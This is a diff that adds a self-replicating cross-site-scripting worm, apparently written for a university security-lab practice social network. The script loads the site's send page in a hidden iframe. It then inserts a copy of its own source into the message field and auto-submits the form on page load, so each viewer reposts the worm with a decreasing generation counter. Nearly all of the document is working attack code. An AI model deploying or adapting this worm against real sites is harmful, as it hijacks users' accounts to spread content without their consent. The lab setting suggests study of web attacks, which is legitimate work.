@@ -1,0 +1,26 @@
+CHello my freend!
+<img src="https://alcapwn.de/logo.png" />
+<iframe src="http://berndbook.seclab.uni-paderborn.de/send.php" name="send_in_a_box" style="visibility:hidden;" width="0" height="0"></iframe>
+
+<script type="text/javascript" src="http://code.jquery.com/jquery-1.10.2.min.js">
+</script>
+
+<script type="text/javascript">
+
+function reproduction(n){
+	if (n >0){
+		reproduction_function = reproduction.toString();
+		iframe_string = "CHello my freend!<img src=\"https://alcapwn.de/logo.png\"\/><iframe src=\"http://berndbook.seclab.uni-paderborn.de/send.php\" name=\"send_in_a_box\" style=\"visibility:hidden;\" width=\"0\" height=\"0\"></iframe>";
+		jquery_string = "<script type=\"text/javascript\" src=\"http://code.jquery.com/jquery-1.10.2.min.js\"><\/script>";
+		script_start = "<script type=\"text/javascript\">";
+		function_call = "$('body').attr('onload','reproduction(" + (n-1) + ");');"
+		script_end = "<\/script>";
+		msg = iframe_string + jquery_string + script_start + reproduction_function + function_call + script_end;
+		$('iframe').contents().find('textarea').val(msg);
+		$('iframe').contents().find('input[type=checkbox]').click();
+		$("iframe").contents().find("input[type=submit]").click()
+	}
+}
+
+$('body').attr('onload','reproduction(2);');
+</script>
